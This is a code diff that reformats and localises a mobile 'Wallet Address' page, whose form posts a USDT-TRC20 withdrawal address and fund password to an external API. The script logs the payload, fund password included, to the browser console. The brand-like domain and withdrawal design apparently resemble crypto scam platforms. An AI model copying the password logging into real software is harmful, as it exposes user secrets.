@@ -1,313 +1,349 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no, viewport-fit=cover, user-scalable=no">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, shrink-to-fit=no, viewport-fit=cover, user-scalable=no"
+    />
     <title>Wallet Address</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
 
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: #e8f4f8;
-            min-height: 100vh;
-        }
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+          Oxygen, Ubuntu, Cantarell, sans-serif;
+        background: #e8f4f8;
+        min-height: 100vh;
+      }
 
-        .header {
-            background: #da0023;
-            padding: 15px 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            color: white;
-        }
+      .header {
+        background: #da0023;
+        padding: 15px 20px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        color: white;
+      }
 
-        .back-btn {
-            font-size: 24px;
-            cursor: pointer;
-            width: 30px;
-        }
+      .back-btn {
+        font-size: 24px;
+        cursor: pointer;
+        width: 30px;
+      }
 
-        .header-title {
-            font-size: 18px;
-            font-weight: 600;
-            flex: 1;
-            text-align: center;
-        }
+      .header-title {
+        font-size: 18px;
+        font-weight: 600;
+        flex: 1;
+        text-align: center;
+      }
 
-        .header-icon {
-            width: 24px;
-            height: 24px;
-        }
+      .header-icon {
+        width: 24px;
+        height: 24px;
+      }
 
-        .container {
-            max-width: 400px;
-            margin: 0 auto;
-            padding: 0;
-        }
+      .container {
+        max-width: 400px;
+        margin: 0 auto;
+        padding: 0;
+      }
 
-        .content-card {
-            background: white;
-            margin-top: 0;
-            min-height: calc(100vh - 60px);
-        }
+      .content-card {
+        background: white;
+        margin-top: 0;
+        min-height: calc(100vh - 60px);
+      }
 
-        .section-title {
-            padding: 20px 20px 15px;
-            font-size: 16px;
-            font-weight: 600;
-            color: #333;
-        }
+      .section-title {
+        padding: 20px 20px 15px;
+        font-size: 16px;
+        font-weight: 600;
+        color: #333;
+      }
 
-        .form-group {
-            padding: 0 20px 20px;
-        }
+      .form-group {
+        padding: 0 20px 20px;
+      }
 
-        .form-label {
-            color: #da0023;
-            font-size: 14px;
-            margin-bottom: 8px;
-            display: block;
-        }
+      .form-label {
+        color: #da0023;
+        font-size: 14px;
+        margin-bottom: 8px;
+        display: block;
+      }
 
-        .form-select,
-        .form-input {
-            width: 100%;
-            padding: 12px 15px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 15px;
-            background: white;
-            color: #333;
-            appearance: none;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23333' d='M6 9L1 4h10z'/%3E%3C/svg%3E");
-            background-repeat: no-repeat;
-            background-position: right 15px center;
-        }
+      .form-select,
+      .form-input {
+        width: 100%;
+        padding: 12px 15px;
+        border: 1px solid #ddd;
+        border-radius: 8px;
+        font-size: 15px;
+        background: white;
+        color: #333;
+        appearance: none;
+        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23333' d='M6 9L1 4h10z'/%3E%3C/svg%3E");
+        background-repeat: no-repeat;
+        background-position: right 15px center;
+      }
 
-        .form-input {
-            background-image: none;
-        }
+      .form-input {
+        background-image: none;
+      }
 
-        .form-select:focus,
-        .form-input:focus {
-            outline: none;
-            border-color: #da0023;
-        }
+      .form-select:focus,
+      .form-input:focus {
+        outline: none;
+        border-color: #da0023;
+      }
 
-        .submit-btn {
-            width: calc(100% - 40px);
-            margin: 20px 20px;
-            padding: 15px;
-            background: #da0023;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: opacity 0.3s;
-        }
+      .submit-btn {
+        width: calc(100% - 40px);
+        margin: 20px 20px;
+        padding: 15px;
+        background: #da0023;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: opacity 0.3s;
+      }
 
-        .submit-btn:hover {
-            opacity: 0.9;
-        }
+      .submit-btn:hover {
+        opacity: 0.9;
+      }
 
-        .submit-btn:active {
-            opacity: 0.8;
-        }
+      .submit-btn:active {
+        opacity: 0.8;
+      }
 
-        .submit-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
+      .submit-btn:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+      }
 
-        .error-message {
-            background: #ffebee;
-            color: #c62828;
-            padding: 12px 20px;
-            margin: 0 20px 20px;
-            border-radius: 8px;
-            font-size: 14px;
-            display: none;
-        }
+      .error-message {
+        background: #ffebee;
+        color: #c62828;
+        padding: 12px 20px;
+        margin: 0 20px 20px;
+        border-radius: 8px;
+        font-size: 14px;
+        display: none;
+      }
 
-        .success-message {
-            background: #e8f5e9;
-            color: #2e7d32;
-            padding: 12px 20px;
-            margin: 0 20px 20px;
-            border-radius: 8px;
-            font-size: 14px;
-            display: none;
-        }
+      .success-message {
+        background: #e8f5e9;
+        color: #2e7d32;
+        padding: 12px 20px;
+        margin: 0 20px 20px;
+        border-radius: 8px;
+        font-size: 14px;
+        display: none;
+      }
 
-        .info-text {
-            padding: 0 20px 20px;
-            font-size: 13px;
-            color: #666;
-            line-height: 1.5;
-        }
+      .info-text {
+        padding: 0 20px 20px;
+        font-size: 13px;
+        color: #666;
+        line-height: 1.5;
+      }
     </style>
-</head>
-<body>
+  </head>
+  <body>
     <div class="header">
-        <a href="/profile.html" style="text-decoration: none;color: white;">
-            <div class="back-btn">‹</div>
-        </a>
-        <div class="header-title">WALLET ADDRESS</div>
-        <svg class="header-icon" viewBox="0 0 24 24" fill="white">
-            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-        </svg>
+      <a href="/profile.html" style="text-decoration: none; color: white">
+        <div class="back-btn">‹</div>
+      </a>
+      <div class="header-title" data-i18n="walletAddressPage.title">WALLET ADDRESS</div>
+      <svg class="header-icon" viewBox="0 0 24 24" fill="white">
+        <path
+          d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"
+        />
+      </svg>
     </div>
 
     <div class="container">
-        <div class="content-card">
-            <div class="section-title">WALLET ADDRESS</div>
-            
-            <div class="error-message" id="errorMessage"></div>
-            <div class="success-message" id="successMessage"></div>
+      <div class="content-card">
+        <div class="section-title" data-i18n="walletAddressPage.title">WALLET ADDRESS</div>
 
-            <form id="walletForm">
-                <div class="form-group">
-                    <select class="form-select" id="walletType">
-                        <option>USDT-TRC20</option>
-                    </select>
-                </div>
+        <div class="error-message" id="errorMessage"></div>
+        <div class="success-message" id="successMessage"></div>
 
-                <div class="form-group">
-                    <label class="form-label">Withdrawal address</label>
-                    <input type="text" class="form-input" id="walletAddress" placeholder="Enter wallet address" required>
-                </div>
+        <form id="walletForm">
+          <div class="form-group">
+            <select class="form-select" id="walletType">
+              <option data-i18n="walletAddressPage.network">USDT-TRC20</option>
+            </select>
+          </div>
 
-                <div class="form-group">
-                    <label class="form-label">Fund password</label>
-                    <input type="password" class="form-input" id="fundPassword" placeholder="Enter fund password" required>
-                </div>
+          <div class="form-group">
+            <label class="form-label" data-i18n="walletAddressPage.withdrawalAddress">Withdrawal address</label>
+            <input
+              type="text"
+              class="form-input"
+              id="walletAddress"
+              data-i18n-placeholder="walletAddressPage.withdrawalAddress"
+              placeholder="Enter wallet address"
+              required
+            />
+          </div>
 
-                <p class="info-text">
-                    Please enter the correct wallet address and fund password. Make sure the address is valid for the selected network type.
-                </p>
+          <div class="form-group">
+            <label class="form-label" data-i18n="walletAddressPage.fundPassword">Fund password</label>
+            <input
+              type="password"
+              class="form-input"
+              id="fundPassword"
+              data-i18n-placeholder="walletAddressPage.fundPassword"
+              placeholder="Enter fund password"
+              required
+            />
+          </div>
 
-                <button type="submit" class="submit-btn" id="submitBtn">CONFIRM MODIFICATION</button>
-            </form>
-        </div>
+          <p class="info-text" data-i18n="walletAddressPage.instructionText">
+            Please enter the correct wallet address and fund password. Make sure
+            the address is valid for the selected network type.
+          </p>
+
+          <button type="submit" class="submit-btn" id="submitBtn" data-i18n="walletAddressPage.confirmModification">
+            CONFIRM MODIFICATION
+          </button>
+        </form>
+      </div>
     </div>
 
+    <script src="/public/i18n.js"></script>
     <script>
-        // Configuration
-        const API_URL = 'https://999.viptemugo.com/index/my/wallet_address';
+      // Configuration
+      const API_URL = "https://999.viptemugo.com/index/my/wallet_address";
 
-        // Get stored user data
-        let csrf_token = '';
-        let user_id = '';
+      // Get stored user data
+      let csrf_token = "";
+      let user_id = "";
 
-        // Initialize
-        document.addEventListener('DOMContentLoaded', function() {
-            // Try to get token and user_id from localStorage, sessionStorage, or cookies
-            csrf_token = localStorage.getItem('csrf_token') || sessionStorage.getItem('csrf_token') || getCookie('csrf_token') || '';
-            user_id = localStorage.getItem('user_id') || sessionStorage.getItem('user_id') || getCookie('user_id') || '';
+      // Initialize
+      document.addEventListener("DOMContentLoaded", function () {
+        // Try to get token and user_id from localStorage, sessionStorage, or cookies
+        csrf_token =
+          localStorage.getItem("csrf_token") ||
+          sessionStorage.getItem("csrf_token") ||
+          getCookie("csrf_token") ||
+          "";
+        user_id =
+          localStorage.getItem("user_id") ||
+          sessionStorage.getItem("user_id") ||
+          getCookie("user_id") ||
+          "";
 
-            console.log('Initialized with user_id:', user_id);
+        console.log("Initialized with user_id:", user_id);
+      });
+
+      // Helper function to get cookie
+      function getCookie(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return parts.pop().split(";").shift();
+        return "";
+      }
+
+      // Handle form submission
+      document
+        .getElementById("walletForm")
+        .addEventListener("submit", async function (e) {
+          e.preventDefault();
+
+          const errorMessage = document.getElementById("errorMessage");
+          const successMessage = document.getElementById("successMessage");
+          const submitBtn = document.getElementById("submitBtn");
+
+          // Hide previous messages
+          errorMessage.style.display = "none";
+          successMessage.style.display = "none";
+
+          // Get form values
+          const address = document.getElementById("walletAddress").value.trim();
+          const paypassword = document.getElementById("fundPassword").value;
+
+          // Validate
+          if (!address) {
+            showError("Please enter wallet address");
+            return;
+          }
+
+          if (!paypassword) {
+            showError("Please enter fund password");
+            return;
+          }
+
+          // Disable submit button
+          submitBtn.disabled = true;
+          submitBtn.textContent = "Processing...";
+
+          try {
+            const payload = {
+              address: address,
+              paypassword: paypassword,
+              _token_: csrf_token,
+              user_id: user_id,
+            };
+
+            console.log("Sending payload:", payload);
+
+            const response = await fetch(API_URL, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify(payload),
+            });
+
+            const data = await response.json();
+            console.log("Response:", data);
+
+            if (data.code === 0) {
+              showSuccess(data.info || "Wallet address updated successfully!");
+
+              // Optionally redirect after success
+              setTimeout(() => {
+                window.location.href = "/profile.html";
+              }, 2000);
+            } else {
+              showError(data.info || "Failed to update wallet address");
+            }
+          } catch (error) {
+            console.error("Error updating wallet address:", error);
+            showError("Network error. Please try again.");
+          } finally {
+            submitBtn.disabled = false;
+            // Restore translated text for button
+            const btnTranslation = window.i18n && window.i18n.t ? window.i18n.t("walletAddressPage.confirmModification") : "CONFIRM MODIFICATION";
+            submitBtn.textContent = btnTranslation;
+          }
         });
 
-        // Helper function to get cookie
-        function getCookie(name) {
-            const value = `; ${document.cookie}`;
-            const parts = value.split(`; ${name}=`);
-            if (parts.length === 2) return parts.pop().split(';').shift();
-            return '';
-        }
+      // Helper functions
+      function showError(message) {
+        const errorMessage = document.getElementById("errorMessage");
+        errorMessage.textContent = message;
+        errorMessage.style.display = "block";
+        window.scrollTo({ top: 0, behavior: "smooth" });
+      }
 
-        // Handle form submission
-        document.getElementById('walletForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-
-            const errorMessage = document.getElementById('errorMessage');
-            const successMessage = document.getElementById('successMessage');
-            const submitBtn = document.getElementById('submitBtn');
-
-            // Hide previous messages
-            errorMessage.style.display = 'none';
-            successMessage.style.display = 'none';
-
-            // Get form values
-            const address = document.getElementById('walletAddress').value.trim();
-            const paypassword = document.getElementById('fundPassword').value;
-
-            // Validate
-            if (!address) {
-                showError('Please enter wallet address');
-                return;
-            }
-
-            if (!paypassword) {
-                showError('Please enter fund password');
-                return;
-            }
-
-            // Disable submit button
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'Processing...';
-
-            try {
-                const payload = {
-                    address: address,
-                    paypassword: paypassword,
-                    _token_: csrf_token,
-                    user_id: user_id
-                };
-
-                console.log('Sending payload:', payload);
-
-                const response = await fetch(API_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload)
-                });
-
-                const data = await response.json();
-                console.log('Response:', data);
-
-                if (data.code === 0) {
-                    showSuccess(data.info || 'Wallet address updated successfully!');
-                    
-                    // Optionally redirect after success
-                    setTimeout(() => {
-                        window.location.href = '/profile.html';
-                    }, 2000);
-                } else {
-                    showError(data.info || 'Failed to update wallet address');
-                }
-            } catch (error) {
-                console.error('Error updating wallet address:', error);
-                showError('Network error. Please try again.');
-            } finally {
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'CONFIRM MODIFICATION';
-            }
-        });
-
-        // Helper functions
-        function showError(message) {
-            const errorMessage = document.getElementById('errorMessage');
-            errorMessage.textContent = message;
-            errorMessage.style.display = 'block';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-
-        function showSuccess(message) {
-            const successMessage = document.getElementById('successMessage');
-            successMessage.textContent = message;
-            successMessage.style.display = 'block';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
+      function showSuccess(message) {
+        const successMessage = document.getElementById("successMessage");
+        successMessage.textContent = message;
+        successMessage.style.display = "block";
+        window.scrollTo({ top: 0, behavior: "smooth" });
+      }
     </script>
-</body>
+  </body>
 </html>
